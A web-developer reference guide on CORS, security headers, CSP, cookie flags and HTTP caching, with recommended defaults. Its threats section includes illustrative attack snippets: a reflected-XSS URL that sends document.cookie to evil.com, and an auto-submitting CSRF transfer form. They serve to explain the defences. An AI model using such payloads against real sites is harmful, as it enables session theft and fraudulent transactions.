---
layout: ../layouts/GistLayout.astro
tags: [security, http, caching, web, guide]
---

# Browser Security & Caching

A concise reference for the HTTP-level security and caching surface of web apps: CORS, security headers, the common threats they defend against, cookie settings, and caching strategies including stale-while-revalidate.

---

## Table of Contents

1. [Same-Origin Policy & CORS](#1-same-origin-policy--cors)
2. [Security Headers](#2-security-headers)
3. [Common Threats & Mitigations](#3-common-threats--mitigations)
4. [Cookie Settings](#4-cookie-settings)
5. [HTTP Caching](#5-http-caching)
6. [Caching Strategies & SWR](#6-caching-strategies--swr)
7. [A Sensible Baseline](#7-a-sensible-baseline)

---

## 1. Same-Origin Policy & CORS

### What we're trying to achieve

Your SPA is served from `https://app.example.com`. Its JavaScript needs to call your API at `https://api.example.com`. Those are **different origins** (different host = different origin), so the browser's Same-Origin Policy (SOP) gets involved. An origin is `scheme + host + port`.

### Why the browser blocks cross-origin reads

Browsers attach your cookies to requests **automatically** (ambient authority). Without a rule, any site you happen to visit - say `https://evil.com` - could run:

```js
fetch('https://bank.example/account', { credentials: 'include' }).then(r => r.json())
```

and read your balance using *your* logged-in bank cookies. SOP prevents exactly this: the browser may *send* the request, but it **hides the response** from `evil.com`'s JavaScript. The whole point of SOP is to stop one site from reading another site's authenticated data.

### Why CORS is the server "opting in"

The catch: SOP also blocks your *legitimate* `app.example.com → api.example.com` call from reading its response. CORS is how the API tells the browser "I trust this origin to read my responses." The browser stamps every cross-origin request with its `Origin`, and the API echoes back an allowance:

```http
# Request: browser → api.example.com  (browser adds this automatically)
Origin: https://app.example.com

# Response: api.example.com → browser
Access-Control-Allow-Origin: https://app.example.com
```

The browser sees its `Origin` reflected in `Access-Control-Allow-Origin` and *then* hands the response to `app`'s JS. `evil.com` is never in that allowlist, so its read stays blocked. CORS doesn't grant a new power - it **selectively relaxes** SOP for origins the server names.

### Why CORS is not server-side access control

Two things people miss, both of which explain why CORS ≠ security for *your* API:

1. The request **usually still reaches your server** - the browser blocks the *response from being read by JS*, not the request from being sent. A `GET` may already have run on the server before the browser discards the response.
2. **Only browsers enforce CORS.** `curl`, a mobile app, or another server ignores it entirely.

So CORS protects your *users' browsers* from cross-origin data leaks - it is **not** a firewall and **not** authorization. Your API must still authenticate and authorize every request itself.

### Preflight: ask before doing

For requests that could have side effects - anything beyond a "simple" GET/POST (e.g. `DELETE`, custom headers, or `Content-Type: application/json`) - the browser sends a **preflight `OPTIONS` first** and won't send the real request until the server approves:

```http
# Preflight: browser → api  (automatic, before the real DELETE)
OPTIONS /orders/42
Origin: https://app.example.com
Access-Control-Request-Method: DELETE

# Approval: api → browser
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Max-Age: 600          # cache this approval for 10 min
```

Why it exists: it ensures a destructive `DELETE` isn't actually delivered until the browser has confirmed the origin and method are allowed.

### Why credentials raise the bar

If the SPA sends cookies (`fetch(..., { credentials: 'include' })`), ambient authority is back in play, so the browser demands stricter opt-in: the server must echo the **exact** origin (never `*`) **and** add `Access-Control-Allow-Credentials: true`. A wildcard with credentials is forbidden - it would let *any* site read authenticated responses, recreating the `evil.com` problem.

```http
Access-Control-Allow-Origin: https://app.example.com   # exact, never *
Access-Control-Allow-Credentials: true
Vary: Origin                                            # cache correctly when echoing origin
```

### Header reference

These are the headers the **server** sets on responses (the browser adds `Origin` and, on preflights, `Access-Control-Request-Method`/`-Headers` automatically - you don't set those).

| Header | What it does / why | Example |
| --- | --- | --- |
| `Access-Control-Allow-Origin` | The single origin the browser may expose the response to. Echo the request's `Origin` for a dynamic allowlist, or hardcode one. `*` permits any origin but is **rejected when credentials are sent**. | `https://app.example.com` |
| `Access-Control-Allow-Credentials` | Opts in to sending cookies / `Authorization` cross-origin. Required for `credentials: 'include'`, and forces an exact `Allow-Origin` (no `*`). | `true` |
| `Access-Control-Allow-Methods` | Methods the browser may use, returned in the **preflight**. If the real request's method isn't listed, the browser blocks it before sending. | `GET, POST, PUT, DELETE` |
| `Access-Control-Allow-Headers` | Request headers the browser may send, returned in the **preflight**. Must list every custom/non-simple header (e.g. `Authorization`, `X-CSRF-Token`) or the real request is blocked. | `Content-Type, Authorization` |
| `Access-Control-Expose-Headers` | Response headers JS is allowed to **read**. By default only "simple" ones are visible - a custom `X-Total-Count` won't be readable unless exposed here. | `X-Total-Count, Location` |
| `Access-Control-Max-Age` | Seconds the browser caches this preflight result, so it skips re-asking on every call. Browsers cap it (Chrome ~2h). | `600` |
| `Vary: Origin` | Not a CORS header, but required when you echo a dynamic `Origin`: it tells shared caches the response varies per origin, so origin A's allowance isn't served to origin B. | `Origin` |

> Avoiding CORS entirely (same origin via a reverse proxy / CDN path routing) is simpler and more secure than getting credentialed cross-origin right. See the [SvelteKit SPA guide](/sveltekit-spa-data-loading/#10-authentication--protected-routes).

---

## 2. Security Headers

These are all **HTTP response headers** - the browser reads them off the response and changes its own behavior. Page JavaScript cannot set or override them, which is the point: a compromised page can't switch off its own protections. They're emitted at one of three layers:

- **App / origin server** - framework middleware (Express `helmet`, a SvelteKit `handle` hook, Go middleware). Use this when the value is dynamic (e.g. a per-request CSP nonce).
- **Reverse proxy / web server** - nginx `add_header`, Apache `Header set`. Good for static, app-wide values.
- **CDN / edge** - a CloudFront response-headers policy, Cloudflare rules. Applied closest to the user, common for static sites.

| Header | Defends against | Why / how it works | Example |
| --- | --- | --- | --- |
| `Strict-Transport-Security` | Protocol downgrade / MITM | Tells the browser "only ever reach me over HTTPS for N seconds" - removes the plaintext hop an attacker hijacks | `max-age=63072000; includeSubDomains; preload` |
| `Content-Security-Policy` | XSS, injection | Allowlists what may load/run, so an injected script won't execute even if it reaches the DOM | `default-src 'self'` |
| `X-Content-Type-Options` | MIME sniffing | Stops the browser guessing a response's type (e.g. executing an uploaded "image" as JS) | `nosniff` |
| `X-Frame-Options` / CSP `frame-ancestors` | Clickjacking | Controls who may frame your page; `frame-ancestors` is the modern CSP replacement | `frame-ancestors 'none'` |
| `Referrer-Policy` | Referrer leakage | Limits how much of the URL is sent in `Referer` to other sites (paths/tokens can leak) | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Feature abuse | Disables powerful APIs (camera, geolocation) so injected code can't reach them | `geolocation=(), camera=()` |
| `Cross-Origin-Opener-Policy` / `-Embedder-Policy` | Spectre / cross-origin leaks | Isolates your browsing context; required to re-enable `SharedArrayBuffer` | `same-origin` / `require-corp` |

**Quick picks:** enable HSTS, `nosniff`, and a CSP everywhere. `frame-ancestors`: `'none'` unless you intentionally embed your own pages (then `'self'`). `Referrer-Policy`: `strict-origin-when-cross-origin` is the safe default (`no-referrer` for maximum privacy). `Permissions-Policy`: deny every feature you don't use. COOP/COEP only matter if you need cross-origin isolation (e.g. `SharedArrayBuffer`) - skip otherwise.

### HSTS - the attack it stops

Without HSTS, a user typing `example.com` first hits `http://`, and the server `301`s to `https://`. An attacker on the same network (coffee-shop Wi-Fi) intercepts that first plaintext request and keeps the victim on http, proxying traffic - an **SSL-strip** attack. HSTS tells the browser to *never* use http for the domain, so there's no plaintext hop to hijack. `preload` (after submitting to [hstspreload.org](https://hstspreload.org)) ships the rule inside the browser binary, protecting even the very first visit. Qualifying needs `max-age >= 31536000` + `includeSubDomains` + `preload`.

> HSTS is sticky and unforgiving: `includeSubDomains` + `preload` applies to *every* subdomain, and browsers won't reach them over http until the `max-age` expires. Make sure all subdomains are HTTPS-ready first.

### CSP - the real XSS mitigation

CSP allowlists where resources may come from, so a `<script>` an attacker injects simply won't run - defense-in-depth for when output encoding is missed (see §3). It has the most knobs of any header here, so take it in three parts: the **directives** (what to restrict), the **source values** (what to allow), and **how nonces/hashes are generated**.

#### Key directives - what each controls

| Directive | Controls | Typical value |
| --- | --- | --- |
| `default-src` | Fallback for the other `*-src` directives | `'self'` |
| `script-src` | Where scripts may load/run (the XSS-critical one) | `'self' 'nonce-…'` |
| `style-src` | Stylesheets / inline styles | `'self'` |
| `img-src` | Image sources | `'self' data:` |
| `connect-src` | `fetch`/XHR/WebSocket targets | your API origins |
| `font-src` | Font sources | `'self'` |
| `object-src` | `<object>`/`<embed>` (legacy plugins) | `'none'` |
| `base-uri` | Restricts `<base>` (stops base-tag injection) | `'self'` |
| `frame-ancestors` | Who may frame your page (clickjacking) | `'none'` or `'self'` |
| `form-action` | Where forms may submit | `'self'` |
| `frame-src` | What you may embed in iframes | as needed |
| `upgrade-insecure-requests` | Auto-upgrade http subresources to https | (flag) |
| `report-to` | Where violation reports are sent | your endpoint |

#### Source values - what each one means

By default CSP allows scripts only from sources you list, and **blocks all inline `<script>`** - that block is what stops an injected script from running. The values fall into two groups.

**Where scripts may load from:**

- `'self'` - your own origin (the usual base).
- `https://cdn.example.com` - one named host. Keep the list short and specific; broad allowlists (or a bare `https:`) are easy to abuse.
- `'none'` - nothing at all. Use on directives you want fully shut, e.g. `object-src 'none'`.

**How to permit the specific inline scripts you actually need:**

- `'nonce-<v>'` - allow only the `<script nonce="<v>">` tags carrying this exact token. The token must be random and **fresh per response** (see below).
- `'sha256-<hash>'` - allow the one inline script whose contents hash to this value. The hash is **fixed for fixed content**.
- `'strict-dynamic'` - also trust scripts that an already-trusted (nonce'd) script loads. Lets you drop fragile host allowlists; the modern choice for `script-src`.
- `'unsafe-inline'` - allow **every** inline script/style/handler. This re-permits exactly what CSP exists to block - an injected `<script>steal()</script>` would run again - so **in `script-src` it cancels your XSS protection**. Don't use it there. (Lower-risk in `style-src`, but still prefer to avoid.)
- `'unsafe-eval'` - allow `eval()` / `new Function()`. Avoid; refactor the code instead.

#### Nonces & hashes - how they're generated

The two safe ways to allow inline scripts differ in *who generates the value and when*:

- A **nonce is dynamic - generated once per response.** A static or reused nonce is worthless (an attacker would just copy it into their injected script), so nonces require a **server rendering the page** (SSR/BFF).
- A **hash is static** - a fingerprint of specific script *content*, computed once at build and hardcoded. So **static sites use hashes** while **server-rendered apps use nonces**.

For a nonce, one render pass emits the same per-request value twice - in the header and on each inline tag it controls:

```js
const nonce = crypto.randomBytes(16).toString('base64')
res.setHeader('Content-Security-Policy', `script-src 'self' 'nonce-${nonce}'`)  // header
res.send(`<script nonce="${nonce}">/* init */</script>`)                        // markup
```

The browser runs an inline `<script>` only if its `nonce` matches the header; an injected script has none, so it's blocked. Frameworks automate this stamping - SvelteKit, for example:

```js
// svelte.config.js
kit: { csp: { mode: 'auto', directives: { 'script-src': ['self'] } } }
```

It mints the per-response nonce, adds it to the header, and applies it to the `<script>`/`<link>` tags it emits during SSR. `mode: 'auto'` uses **nonces for SSR pages and hashes for prerendered pages** - the same SSR-vs-static split from the SPA guide. (A `<meta http-equiv="Content-Security-Policy">` tag can carry a *static* policy but can't use `frame-ancestors`, reporting, or Report-Only - so the response header is preferred.)

> **In a pure SPA** (static files, no request-time server): nonces aren't possible - use **hashes**, computed at build. But most code is external bundles (`<script src>`) already covered by `script-src 'self'`, so hashes only matter for the inline scripts your framework emits. SvelteKit's `csp` `hash`/`auto` mode hashes those and injects the policy as a `<meta>` tag. Directives `<meta>` can't carry (`frame-ancestors`, reporting) plus HSTS go on the **CDN/host** (CloudFront, Netlify `_headers`, nginx) as static headers. If the build emits no inline scripts, plain `script-src 'self'` is enough.

#### Rollout & practical policy

Roll out with **`Content-Security-Policy-Report-Only`** + a reporting endpoint first - violations are reported but nothing is blocked, so you catch breakage before enforcing. Then start strict and loosen only where reports demand it:

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-<v>' 'strict-dynamic';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
  form-action 'self'
```

- **Scripts:** prefer **nonce + `'strict-dynamic'`** over host allowlists - allowlists are easy to misconfigure and often bypassable. Never put `'unsafe-inline'`/`'unsafe-eval'` in `script-src`.
- **Cheap high-value wins:** `object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'none'`, `form-action 'self'` - add these even before tackling inline scripts.
- **`connect-src`:** pin to your API origin(s) so injected code can't beacon data out.

---

## 3. Common Threats & Mitigations

The headers and cookie flags in this guide exist to defend against a handful of recurring browser attacks. Knowing the attack makes the defense obvious.

| Threat | What the attacker does | Why the mitigation stops it |
| --- | --- | --- |
| **XSS** | Gets their JS running in your origin, then reads the DOM/cookies or makes authed calls as the user | Encoding renders their input as *text*, not code; CSP blocks scripts it didn't sanction; `HttpOnly` keeps the session cookie unreadable |
| **CSRF** | Tricks the user's browser into sending an authed request from another site, riding the ambient cookie | `SameSite` stops the cookie being attached cross-site; a CSRF token proves the request came from your own page |
| **Clickjacking** | Frames your page invisibly over a decoy so the user's clicks hit your UI | `frame-ancestors 'none'` makes the browser refuse to be framed |
| **MITM / downgrade** | Intercepts plaintext traffic on a shared network | HTTPS encrypts it; HSTS removes the plaintext hop entirely |
| **Open redirect** | Uses your `?next=` param to bounce victims to a malicious site under your domain's trust | Allowlist redirect targets; never redirect to arbitrary user input |

### XSS up close

Almost always: untrusted data reaches HTML/JS without encoding. A *reflected* example - a search page that echoes the query:

```text
https://app.example.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>
```

If the template drops `q` straight into HTML, that script runs in your origin and exfiltrates every non-`HttpOnly` cookie. The fixes:

```js
el.innerHTML = userInput                        // vulnerable - injects markup
el.textContent = userInput                      // safe - rendered as text
el.innerHTML = DOMPurify.sanitize(userInput)    // when HTML is genuinely needed
```

Modern frameworks (Svelte, React) auto-escape `{value}` interpolation - the danger is the escape hatches (`{@html}`, `dangerouslySetInnerHTML`). CSP (§2) is the backstop for when encoding is missed.

### CSRF up close

The attack relies on the browser **automatically attaching cookies**. The user is logged into `bank.example`; they visit `evil.com`, which contains:

```html
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>   <!-- fires on page load -->
```

The browser attaches the bank's session cookie and the transfer succeeds - the user never clicked. `SameSite=Lax/Strict` fixes it: the cookie isn't sent on this cross-site POST. Token-in-header auth is structurally immune (no ambient credential to ride) but XSS-exposed - you pick which class you defend structurally (see the cookie-vs-token tradeoff in the [SPA auth section](/sveltekit-spa-data-loading/#10-authentication--protected-routes)).

---

## 4. Cookie Settings

A cookie is set by the **server** via a `Set-Cookie` response header (or by JS via `document.cookie`, unless `HttpOnly`). The browser then re-sends it **automatically** on matching requests - which is exactly why these flags matter: they constrain *when* that automatic send happens and *who* can read the value.

| Attribute | Effect | Why it matters |
| --- | --- | --- |
| `HttpOnly` | JS can't read the cookie | XSS can't *steal* the session token (it can still ride it in-page, but not exfiltrate it) |
| `Secure` | Sent only over HTTPS | Prevents the cookie leaking over a plaintext hop |
| `SameSite=Strict` | Never sent on any cross-site request | Max CSRF protection, but logs users out when they arrive via an external link |
| `SameSite=Lax` | Sent only on top-level cross-site **GET** navigation | Blocks cross-site POST/embedded requests (CSRF) while normal links still work - the sensible default |
| `SameSite=None` | Sent on all cross-site requests | Needed for genuine cross-site cookies (embedded widgets); **requires** `Secure` |
| `Domain` | Scope to a domain + its subdomains | Omit for host-only (most secure); set `Domain=example.com` to share across `app.`/`api.` |
| `Path` | URL path scope | Limits which paths receive the cookie |
| `Max-Age` / `Expires` | Lifetime | Omit → session cookie (cleared on browser close) |

### Why `SameSite=Lax` is the default sweet spot

`Strict` withholds the cookie on the first cross-site navigation, so a user clicking a link to your logged-in page arrives logged *out* - which feels broken. `Lax` sends the cookie on top-level GET navigations (clicking a link to you) but withholds it from the dangerous cases: cross-site `POST`s and requests from `<img>`/`<iframe>`/`fetch` on other sites - exactly the CSRF vector from §3. You get CSRF protection without breaking inbound links.

### Cookie prefixes - why they exist

Cookies have weak integrity: **any same-site context can set or overwrite a cookie for the parent domain** - including a *subdomain*, and (without `Secure`) even an attacker on a plaintext connection. So a compromised or attacker-controlled `evil.example.com`, or a MITM on some `http://` subdomain, can send `Set-Cookie: session=...; Domain=example.com` and **overwrite your app's session cookie** - an attack called *cookie tossing* / fixation. Your server only sees the name and value; it can't tell a carefully-set cookie from a maliciously-injected one.

A **name prefix** closes this by encoding the requirement into the cookie's name and having the *browser* enforce it - the browser **refuses to store** a cookie with that name unless it meets the rules:

| Prefix | Browser requires | What it guarantees |
| --- | --- | --- |
| `__Host-` | `Secure`, `Path=/`, and **no** `Domain` | Set over HTTPS and **locked to the exact host** - a subdomain cannot overwrite it |
| `__Secure-` | `Secure` | Set over HTTPS (weaker - still allows `Domain`) |

So when your code reads `__Host-session`, the browser has *already* guaranteed it was set over HTTPS and host-only; a tossed cookie from a subdomain never gets stored under that name in the first place.

**What to use when:** default to **`__Host-`** for session/auth cookies. Use **`__Secure-`** only when you genuinely need to share the cookie across subdomains via `Domain=` (which `__Host-` forbids).

```http
Set-Cookie: __Host-session=abc; HttpOnly; Secure; SameSite=Lax; Path=/
```

---

## 5. HTTP Caching

Caching trades freshness for speed: a cached response skips the network entirely. The directives below are how the **origin/app or CDN** (via the `Cache-Control` response header) tells browsers and shared caches *how long* a response may be reused and *whether* it must be re-checked first.

| `Cache-Control` directive | Meaning | When to use |
| --- | --- | --- |
| `max-age=N` | Fresh for N seconds in the **browser** | Anything cacheable |
| `s-maxage=N` | Freshness for **shared** caches (CDN); overrides `max-age` there | Different CDN vs browser lifetimes |
| `no-cache` | May store, but **must revalidate** before each reuse | Changes unpredictably but supports validators (HTML) |
| `no-store` | Never store, anywhere | Sensitive responses (personal/financial data) |
| `private` | Browser only; CDNs/proxies must not store | Per-user responses |
| `public` | Any cache may store | Shared static assets |
| `must-revalidate` | Once stale, must revalidate (no serving stale on error) | Correctness-critical resources |
| `immutable` | Won't change for its lifetime - skip revalidation | Hashed/fingerprinted assets |
| `stale-while-revalidate=N` | Serve stale up to N s while refreshing in background | Snappy UX on semi-fresh data |
| `stale-if-error=N` | Serve stale up to N s if the origin errors | Resilience to origin downtime |

### Why `no-cache` ≠ `no-store` (the classic trap)

The names mislead. **`no-cache` *does* cache** - it just forces a revalidation before reuse, so the browser confirms "still current?" and usually gets a cheap `304`. **`no-store` caches nothing** - every load is a full fetch. Use `no-store` for sensitive data you never want written to disk; use `no-cache` for things like the HTML document that must always be current but can skip re-downloading when unchanged.

### Validation (conditional requests)

Revalidation is cheap because of validators. The server tags a response with an `ETag` (a content fingerprint) or `Last-Modified` date; the browser sends it back, and the server returns an empty `304 Not Modified` if nothing changed:

```http
# first response
ETag: "v3-abc"
# browser's revalidation request
If-None-Match: "v3-abc"
# server → 304 Not Modified (no body) if the ETag still matches → browser reuses its copy
```

`Last-Modified` / `If-Modified-Since` is the date-based equivalent. This is what makes `no-cache` cheap: a revalidation that returns 304 transfers headers only, not the body.

---

## 6. Caching Strategies & SWR

There's no single cache policy - the right one depends on whether a resource is versioned, shared, and how fresh it must be:

| Resource | Policy | Why this works |
| --- | --- | --- |
| Hashed static assets (`app.4f2a.js`) | `public, max-age=31536000, immutable` | The hash in the filename *is* the version - new content gets a new name, so the old file can be cached forever and never revalidated |
| HTML entry document | `no-cache` (or short `max-age`) | It references the hashed assets, so it must always be current - otherwise users load stale asset filenames after a deploy |
| Private / API data | `private, no-store` or short `max-age` + SWR | Per-user data must not sit in shared caches; freshness usually matters |

### stale-while-revalidate

Serve the cached (stale) copy **instantly** while fetching a fresh one in the background - the user waits for nothing and the cache self-heals:

```http
Cache-Control: max-age=60, stale-while-revalidate=300
```

Fresh for 60s. From 60s to 360s a request gets the stale copy immediately *and* triggers a background refresh, so the next request is fresh. After 360s the cache must revalidate before serving.

### Two layers, same idea

- **HTTP layer** - the directive above, honored by browsers and CDNs, with no app code.
- **Client layer** - TanStack Query's `staleTime` + background refetch is SWR inside the app's memory cache: render cached data instantly, revalidate silently. See [How Caching Works](/sveltekit-spa-data-loading/#6-how-caching-works-across-navigations).

Both deliver "instant, then correct." The difference is granularity: the HTTP layer caches whole responses at the edge/browser; the client layer caches parsed data per query key inside the running app.

---

## 7. A Sensible Baseline

Defaults for a typical app, annotated with *where* each is usually set:

```http
# Security headers - static ones at the edge/proxy; CSP per-request in the app if using nonces
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=()
```

```http
# Caching - set by the origin/CDN, per route or file type
Cache-Control: public, max-age=31536000, immutable   # hashed assets
Cache-Control: no-cache                               # HTML entry document
Cache-Control: private, no-store                      # authenticated API responses
```

Cookies (set by the **app** on login): `__Host-session=...; HttpOnly; Secure; SameSite=Lax; Path=/`. Plus HTTPS everywhere, and roll the CSP out in `Report-Only` mode first.

**Rule of thumb for placement:** static, app-wide values → proxy/CDN; anything dynamic or per-request (CSP nonce, `Set-Cookie`, per-user cache) → the app.

---

## References

- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [MDN: Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [MDN: Cache-Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [web.dev: stale-while-revalidate](https://web.dev/articles/stale-while-revalidate)
